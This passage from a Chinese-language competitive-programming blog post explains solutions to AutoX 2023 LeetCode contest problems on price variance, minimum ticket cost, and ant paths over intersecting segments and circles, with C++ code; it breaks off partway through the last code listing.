<li>本质是数学问题，求方差和平均值。题目中关键信息为 <code>0 &lt;= handle[i][1] &lt;= 100</code>，我们直接用哈希表统计当前元素的个数即可，意味当前保存的不同元素的种类不会超过 $101$ 个：</li>
</ol>
<ul>
<li>平均值：我们保存当前的元素的总和 $sum$ 与总的个数 $total$，每次从价格中删除和添加元素，我们同时更新 $sum$ 和 $total$ 即可，此时均价为 $\dfrac{sum}{total}$。</li>
<li>方差：我们已知平均数为 $\dfrac{sum}{total}$，设此时哈希表中存储的 $k$ 个元素分别为 $p_1, p_2, \cdots, p_k$，元素的个数分别为 $c_1, c_2, \cdots, c_k$，则此时可以知道方差为 $\dfrac{\sum_{i&#x3D;1}^{k} \limits c_i * (p_i - \frac{sum}{total})^{2}}{total}$。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \times \max (price))$，$n$ 表示插入元素的个数，$\max (price)$ 表示元素的最大数。</li>
<li>空间复杂度：时间复杂度为 $O(\max (price))$，$\max (price)$ 表示元素的最大数。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">honeyQuotes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; handle)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">double</span>&gt; ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : handle) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v[<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                cnt[v[<span class="number">1</span>]]++;</span><br><span class="line">                total++;</span><br><span class="line">                sum += v[<span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(v[<span class="number">0</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">                cnt[v[<span class="number">1</span>]]--;</span><br><span class="line">                <span class="keyword">if</span> (cnt[v[<span class="number">1</span>]] == <span class="number">0</span>) &#123;</span><br><span class="line">                    cnt.<span class="built_in">erase</span>(v[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                total--;</span><br><span class="line">                sum -= v[<span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(v[<span class="number">0</span>] == <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (total == <span class="number">0</span>) &#123;</span><br><span class="line">                    ret.<span class="built_in">emplace_back</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ret.<span class="built_in">emplace_back</span>((<span class="type">double</span>)sum / total);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(v[<span class="number">0</span>] == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (total == <span class="number">0</span>) &#123;</span><br><span class="line">                    ret.<span class="built_in">emplace_back</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">double</span> avg = (<span class="type">double</span>)sum / total;</span><br><span class="line">                    <span class="type">double</span> variance = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;&amp;[x, freq] : cnt) &#123;</span><br><span class="line">                        variance += ((<span class="type">double</span>)x - avg)*((<span class="type">double</span>)x - avg) * freq;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ret.<span class="built_in">emplace_back</span>(variance / total);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="AutoX-3-出行的最少购票费用"><a href="#AutoX-3-出行的最少购票费用" class="headerlink" title="AutoX-3. 出行的最少购票费用"></a>AutoX-3. 出行的最少购票费用</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>航空公司向经常乘坐飞机的乘客们提供了一些商务套票，<code>tickets[i] = [duration_i, price_i]</code>，表示第 <code>i</code> 种套票的<strong>有效天数</strong>和<strong>价格</strong>。</p>
<blockquote>
<p>例如：乘客购买了有效天数为 <code>n</code> 的套票，则该套票在第 <code>date ~ date+n-1</code> 天期间都可以使用。</p>
</blockquote>
<p>现有一名乘客将在未来的几天中出行，<code>days[i]</code> 表示他第 <code>i</code> 次出行的时间，如果他选择购买商务套票，请返回他将花费的最少金额。</p>
<p><strong>注意：</strong></p>
<ul>
<li>输入不存在多个有效天数相同的套票。</li>
</ul>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>days = [1,2,3,4]</code><br><code>tickets = [[1,3],[2,5],[3,7]]</code></p>
<p>输出: <code>10</code></p>
<p>解释：可以买一张一天有效期的票和一张三天有效期的票；或买两张两天有效期的票；总票价均为<code>10</code></p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>days = [1,4,5]</code><br><code>tickets = [[1,4],[5,6],[2,5]]</code></p>
<p>输出: <code>6</code></p>
<p>解释：买一张 5 天有效期的票；总票价为<code>6</code></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= days.length &lt;= 10^5</code></li>
<li><code>1 &lt;= days[i] &lt; days[i+1] &lt;= 10^9</code></li>
<li><code>1 &lt;= tickets.length &lt;= 20</code></li>
<li><code>1 &lt;= tickets[i][0] &lt;= 10^5</code></li>
<li><code>1 &lt;= tickets[i][1] &lt;= 10^9</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/autox2023/problems/BjAFy9/">https://leetcode.cn/contest/autox2023/problems/BjAFy9/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>二分 + 动态规划
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>非常不错的动态规划，设 $dp[i]$ 表示到达第 $days[i]$ 天前的最小开销，首先按照要求肯定对 $days$ 按照从小到大进行排序。此时我们肯定知道在 $days[0]$ 前的开销为 $0$，$dp[0] &#x3D; 0$。我们初始化所有的 $dp[i]$ 为 $-1$。</li>
</ol>
<ul>
<li>当我们在 $days[i]$ 处买票 $j$ 时，此时我们知道此时该套票可持续的时间为 $[days[i], days[i] + t[j] - 1]$，则下一次最优购票时间点应该是在大于等于 $days[i] + t[j]$ 且最接近 $days[i] + t[j]$ 的某一天 $days[k]$，我们可以用二分查找找到 $days[k]$。因此我们可以知道递推公式:<br>$$<br>dp[k] &#x3D; min(dp[k], dp[i] + price[j])<br>$$</li>
<li>我们不需要每次都判断 $days[i]$，我们初始化 $dp[i] &#x3D; \infty$ 进行标记，如上面所示一旦我们在 $days[i]$ 处选择了购置票 $j$ 时，最优选择肯定是从 $days[k]$ 处再购置新票，我们分别对最优选择点处进行标记，</li>
<li>发现 $dp[i] &#x3D; \infty$ 则跳过，因此此时该出购票肯定不是最优选择；</li>
<li>发现 $dp[i] \neq \infty$ 时，我们选择购置新票，因此次时之前购置的票时间已经到期，需在此处重新购置新票；</li>
<li>最后返回完成所有行程的最小值即可；</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \times m \times \log n)$，$n$ 为数组 $days$ 的长度，$m$ 为套票的种类数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为数组 $days$ 的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minCostToTravelOnDays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; days, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; tickets)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = days.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = tickets.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(days.<span class="built_in">begin</span>(), days.<span class="built_in">end</span>());</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, LONG_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[i] != LONG_MAX) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                    <span class="type">int</span> x = <span class="built_in">lower_bound</span>(days.<span class="built_in">begin</span>(), days.<span class="built_in">end</span>(), days[i] + tickets[j][<span class="number">0</span>]) - days.<span class="built_in">begin</span>();</span><br><span class="line">                    dp[x] = <span class="built_in">min</span>(dp[x], dp[i] + tickets[j][<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="AutoX-4-蚂蚁爬行"><a href="#AutoX-4-蚂蚁爬行" class="headerlink" title="AutoX-4. 蚂蚁爬行"></a>AutoX-4. 蚂蚁爬行</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>在一张稿纸上画了若干由线条构成的的<strong>线段</strong>和<strong>正圆形</strong>。<code>geometry[i]</code> 表示对于第 <code>i</code> 个线条有：</p>
<ul>
<li>若 <code>geometry[i].length</code> 为 <code>4</code> ，表示为一条线段，<code>[x1, y1, x2, y2]</code> 表示该线段的两个<strong>端点坐标</strong>分别为 <code>(x1,y1)</code> 和 <code>(x2,y2)</code>。</li>
<li>若 <code>geometry[i].length</code> 为 <code>3</code> ，表示为一个正圆形，<code>[x, y, r]</code> 表示其<strong>圆心坐标</strong>和<strong>半径</strong>分别为 <code>(x,y)</code> 和 <code>r</code></li>
</ul>
<p>现有一群小蚂蚁在这些线条上爬行，<code>path[i] = [start, end]</code> 表示第 <code>i</code> 只蚂蚁从第 <code>start</code> 个线条前往第 <code>end</code> 个线条。在爬行过程中，对于任意两个线条，只要有接触（公共点），小蚂蚁就能从一个爬到另一个。请判断这些小蚂蚁能否到达各自的目的地。<br><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<br><code>geometry = [[2,5,7,3],[1,1,4,2],[4,3,2]]</code><br><code>path = [[0,1],[1,2],[0,2]]</code></p>
<p>输出：<code>[true,true,true]</code></p>
<p>解释：如下图所示：<br>所有的几何对象都是可互通的，所有蚂蚁都可以到达目的地。<br><img src="https://pic.leetcode-cn.com/1660622651-nuCZsa-image.png" alt="image.png"></p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>geometry = [[4,1,1],[3,2,1],[1,4,5,4]]</code><br><code>path = [[0,1],[2,0]]</code></p>
<p>输出：<code>[true,false]</code></p>
<p>解释：如下图所示:<br><code>geometry[0]</code> 和 <code>geometry[1]</code> 相接触，<code>geometry[2]</code> 不与任何几何对象接触，因此蚂蚁 <code>1</code> 无法到达，<br><img src="https://pic.leetcode-cn.com/1660531061-qRDVbX-image.png" alt="image.png"></p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= geometry.length &lt;= 1000</code></li>
<li><code>0 &lt;= geometry[i][0],geometry[i][1] &lt;= 10^5</code></li>
<li><code>对于线段，0 &lt;= geometry[i][2],geometry[i][3] &lt;= 10^5</code></li>
<li><code>对于正圆形，1 &lt;= geometry[i][2] &lt;= 10^5</code></li>
<li><code>1 &lt;= path.length &lt;= 1000</code></li>
<li><code>0 &lt;= path[i][0], path[i][1] &lt; geometry.length</code></li>
</ul>
<p>&#96;</p>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/autox2023/problems/TcdlJS/">https://leetcode.cn/contest/autox2023/problems/TcdlJS/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>几何 + 并查集
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>从题目分析来看，本身题目思路非常简单，并查集的思想，但是写对不容易，涉及到计算几何的知识，真不是那么短时间内完全写正确。涉及以下检测：</li>
</ol>
<ul>
<li>两个园是否存在交点；</li>
<li>两个线段是否存在交点；</li>
<li>线段和园是否存在交点；<br>以上检测都不是那么容易短时间完全写对，下面的代码抄模板弄出来的。只需要依次检测第 $i$ 个图形是否与第 $j$ 个图形存在交点，如果存在交点则将两个图形所在的集合进行合并，所谓检测是否存在通路，即代表两个图形在一个集合中。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2 \times \alpha(n) + m \times \alpha(n))$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> xxx</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> Point = std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt;;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">auto</span> eps = <span class="number">1e-12</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">sq</span><span class="params">(<span class="type">double</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;Point&gt; <span class="title">intersects</span><span class="params">(<span class="type">const</span> Point&amp; p1, <span class="type">const</span> Point&amp; p2, <span class="type">const</span> Point&amp; cp, <span class="type">double</span> r, <span class="type">bool</span> segment)</span> </span>&#123;</span><br><span class="line">        std::vector&lt;Point&gt; res;</span><br><span class="line">        <span class="keyword">auto</span> x0 = cp.first;</span><br><span class="line">        <span class="keyword">auto</span> y0 = cp.second;</span><br><span class="line">        <span class="keyword">auto</span> x1 = p1.first;</span><br><span class="line">        <span class="keyword">auto</span> y1 = p1.second;</span><br><span class="line">        <span class="keyword">auto</span> x2 = p2.first;</span><br><span class="line">        <span class="keyword">auto</span> y2 = p2.second;</span><br><span class="line">        <span class="keyword">auto</span> A = y2 - y1;</span><br><span class="line">        <span class="keyword">auto</span> B = x1 - x2;</span><br><span class="line">        <span class="keyword">auto</span> C = x2 * y1 - x1 * y2;</span><br><span class="line">        <span class="keyword">auto</span> a = <span class="built_in">sq</span>(A) + <span class="built_in">sq</span>(B);</span><br><span class="line">        <span class="type">double</span> b, c;</span><br><span class="line">        <span class="type">bool</span> bnz = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>(B) &gt;= eps) &#123;</span><br><span class="line">            b = <span class="number">2</span> * (A * C + A * B * y0 - <span class="built_in">sq</span>(B) * x0);</span><br><span class="line">            c = <span class="built_in">sq</span>(C) + <span class="number">2</span> * B * C * y0 - <span class="built_in">sq</span>(B) * (<span class="built_in">sq</span>(r) - <span class="built_in">sq</span>(x0) - <span class="built_in">sq</span>(y0));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            b = <span class="number">2</span> * (B * C + A * B * x0 - <span class="built_in">sq</span>(A) * y0);</span><br><span class="line">            c = <span class="built_in">sq</span>(C) + <span class="number">2</span> * A * C * x0 - <span class="built_in">sq</span>(A) * (<span class="built_in">sq</span>(r) - <span class="built_in">sq</span>(x0) - <span class="built_in">sq</span>(y0));</span><br><span class="line">            bnz = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> d = <span class="built_in">sq</span>(b) - <span class="number">4</span> * a * c; <span class="comment">// discriminant</span></span><br><span class="line">        <span class="keyword">if</span> (d &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// checks whether a point is within a segment</span></span><br><span class="line">        <span class="keyword">auto</span> within = [x1, y1, x2, y2](<span class="type">double</span> x, <span class="type">double</span> y) &#123;</span><br><span class="line">            <span class="keyword">auto</span> d1 = <span class="built_in">sqrt</span>(<span class="built_in">sq</span>(x2 - x1) + <span class="built_in">sq</span>(y2 - y1));  <span class="comment">// distance between end-points</span></span><br><span class="line">            <span class="keyword">auto</span> d2 = <span class="built_in">sqrt</span>(<span class="built_in">sq</span>(x - x1) + <span class="built_in">sq</span>(y - y1));    <span class="comment">// distance from point to one end</span></span><br><span class="line">            <span class="keyword">auto</span> d3 = <span class="built_in">sqrt</span>(<span class="built_in">sq</span>(x2 - x) + <span class="built_in">sq</span>(y2 - y));    <span class="comment">// distance from point to other end</span></span><br><span class="line">            <span class="keyword">auto</span> delta = d1 - d2 - d3;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(delta) &lt; eps;                    <span class="comment">// true if delta is less than a small tolerance</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> fx = [A, B, C](<span class="type">double</span> x) &#123;</span><br><span class="line">            <span class="keyword">return</span> -(A * x + C) / B;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> fy = [A, B, C](<span class="type">double</span> y) &#123;</span><br><span class="line">            <span class="keyword">return</span> -(B * y + C) / A;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> rxy = [segment, &amp;res, within](<span class="type">double</span> x, <span class="type">double</span> y) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!segment || <span class="built_in">within</span>(x, y)) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(std::<span class="built_in">make_pair</span>(x, y));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> x, y;</span><br><span class="line">        <span class="keyword">if</span> (d == <span class="number">0.0</span>) &#123;</span><br><span class="line">            <span class="comment">// line is tangent to circle, so just one intersect at most</span></span><br><span class="line">            <span class="keyword">if</span> (bnz) &#123;</span><br><span class="line">                x = -b / (<span class="number">2</span> * a);</span><br><span class="line">                y = <span class="built_in">fx</span>(x);</span><br><span class="line">                <span class="built_in">rxy</span>(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                y = -b / (<span class="number">2</span> * a);</span><br><span class="line">                x = <span class="built_in">fy</span>(y);</span><br><span class="line">                <span class="built_in">rxy</span>(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// two intersects at most</span></span><br><span class="line">            d = <span class="built_in">sqrt</span>(d);</span><br><span class="line">            <span class="keyword">if</span> (bnz) &#123;</span><br><span class="line">                x = (-b + d) / (<span class="number">2</span> * a);</span><br><span class="line">                y = <span class="built_in">fx</span>(x);</span><br><span class="line">                <span class="built_in">rxy</span>(x, y);</span><br><span class="line">                x = (-b - d) / (<span class="number">2</span> * a);</span><br><span class="line">                y = <span class="built_in">fx</span>(x);</span><br><span class="line">                <span class="built_in">rxy</span>(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                y = (-b + d) / (<span class="number">2</span> * a);</span><br><span class="line">                x = <span class="built_in">fy</span>(y);</span><br><span class="line">                <span class="built_in">rxy</span>(x, y);</span><br><span class="line">                y = (-b - d) / (<span class="number">2</span> * a);</span><br><span class="line">                x = <span class="built_in">fy</span>(y);</span><br><span class="line">                <span class="built_in">rxy</span>(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> yyy</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> ll = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Point</span></span><br><span class="line">    &#123;</span><br><span class="line">        ll x;</span><br><span class="line">        ll y;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Given three collinear points p, q, r, the function checks if</span></span><br><span class="line">    <span class="comment">// point q lies on line segment &#x27;pr&#x27;</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">onSegment</span><span class="params">(Point p, Point q, Point r)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (q.x &lt;= <span class="built_in">max</span>(p.x, r.x) &amp;&amp; q.x &gt;= <span class="built_in">min</span>(p.x, r.x) &amp;&amp;</span><br><span class="line">            q.y &lt;= <span class="built_in">max</span>(p.y, r.y) &amp;&amp; q.y &gt;= <span class="built_in">min</span>(p.y, r.y))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// To find orientation of ordered triplet (p, q, r).</span></span><br><span class="line">    <span class="comment">// The function returns following values</span></span><br><span class="line">    <span class="comment">// 0 --&gt; p, q and r are collinear</span></span><br><span class="line">    <span class="comment">// 1 --&gt; Clockwise</span></span><br><span class="line">    <span class="comment">// 2 --&gt; Counterclockwise</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orientation</span><span class="params">(Point p, Point q, Point r)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// See https://www.geeksforgeeks.org/orientation-3-ordered-points/</span></span><br><span class="line">        <span class="comment">// for details of below formula.</span></span><br><span class="line">        ll val = (q.y - p.y) * (r.x - q.x) -</span><br><span class="line">            (q.x - p.x) * (r.y - q.y);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// collinear</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (val &gt; <span class="number">0</span>) ? <span class="number">1</span> : <span class="number">2</span>; <span class="comment">// clock or counterclock wise</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The main function that returns true if line segment &#x27;p1q1&#x27;</span></span><br><span class="line">    <span class="comment">// and &#x27;p2q2&#x27; intersect.</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">doIntersect</span><span class="params">(Point p1, Point q1, Point p2, Point q2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Find the four orientations needed for general and</span></span><br><span class="line">        <span class="comment">// special cases</span></span><br><span class="line">        ll o1 = <span class="built_in">orientation</span>(p1, q1, p2);</span><br><span class="line">        ll o2 = <span class="built_in">orientation</span>(p1, q1, q2);</span><br><span class="line">        ll o3 = <span class="built_in">orientation</span>(p2, q2, p1);</span><br><span class="line">        ll o4 = <span class="built_in">orientation</span>(p2, q2, q1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// General case</span></span><br><span class="line">        <span class="keyword">if</span> (o1 != o2 &amp;&amp; o3 != o4)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Special Cases</span></span><br><span class="line">        <span class="comment">// p1, q1 and p2 are collinear and p2 lies on segment p1q1</span></span><br><span class="line">        <span class="keyword">if</span> (o1 == <span class="number">0</span> &amp;&amp; <span class="built_in">onSegment</span>(p1, p2, q1)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// p1, q1 and q2 are collinear and q2 lies on segment p1q1</span></span><br><span class="line">        <span class="keyword">if</span> (o2 == <span class="number">0</span> &amp;&amp; <span class="built_in">onSegment</span>(p1, q2, q1)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// p2, q2 and p1 are collinear and p1 lies on segment p2q2</span></span><br><span class="line">        <span class="keyword">if</span> (o3 == <span class="number">0</span> &amp;&amp; <span class="built_in">onSegment</span>(p2, p1, q2)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// p2, q2 and q1 are collinear and q1 lies on segment p2q2</span></span><br><span class="line">        <span class="keyword">if</span> (o4 == <span class="number">0</span> &amp;&amp; <span class="built_in">onSegment</span>(p2, q1, q2)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// Doesn&#x27;t fall in any of the above cases</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> zzz</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">using</span> Point = std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt;;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">auto</span> eps = <span class="number">1e-12</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">sq</span><span class="params">(<span class="type">double</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">doIntersect</span><span class="params">(Point p1, <span class="type">double</span> r1, Point p2, <span class="type">double</span> r2)</span> </span>&#123;</span><br><span class="line">		<span class="type">double</span> dx = <span class="built_in">sq</span>(p1.first - p2.first);</span><br><span class="line">		<span class="type">double</span> dy = <span class="built_in">sq</span>(p1.second - p2.second);</span><br><span class="line">		<span class="type">double</span> dr = <span class="built_in">sq</span>(r1 + r2);</span><br><span class="line">        <span class="type">double</span> dl = <span class="built_in">sq</span>(r1 - r2);</span><br><span class="line">		<span class="keyword">if</span> (dx + dy &lt;= dr &amp;&amp; dx + dy &gt;= dl) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isIntersect</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; a, vector&lt;<span class="type">int</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.<span class="built_in">size</span>() &lt; b.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">isIntersect</span>(b, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (a.<span class="built_in">size</span>() == b.<span class="built_in">size</span>() &amp;&amp; a.<span class="built_in">size</span>() == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> zzz::<span class="built_in">doIntersect</span>(zzz::<span class="built_in">Point</span>(a[<span class="number">0</span>], a[<span class="number">1</span>]), a[<span class="number">2</span>], zzz::<span class="built_in">Point</span>(b[<span class="number">0</span>], b[<span class="number">1</span>]), b[<span class="number">2</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a.<span class="built_in">size</span>() == b.<span class="built_in">size</span>() &amp;&amp; a.<span class="built_in">size</span>() == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> yyy::<span class="built_in">doIntersect</span>(yyy::Point&#123;a[<span class="number">0</span>], a[<span class="number">1</span>]&#125;, yyy::Point&#123;a[<span class="number">2</span>], a[<span class="number">3</span>]&#125;, yyy::Point&#123;b[<span class="number">0</span>], b[<span class="number">1</span>]&#125;, yyy::Point&#123;b[<span class="number">2</span>], b[<span class="number">3</span>]&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a.<span class="built_in">size</span>() == <span class="number">4</span> &amp;&amp;b.<span class="built_in">size</span>() == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">auto</span> res = xxx::<span class="built_in">intersects</span>(xxx::<span 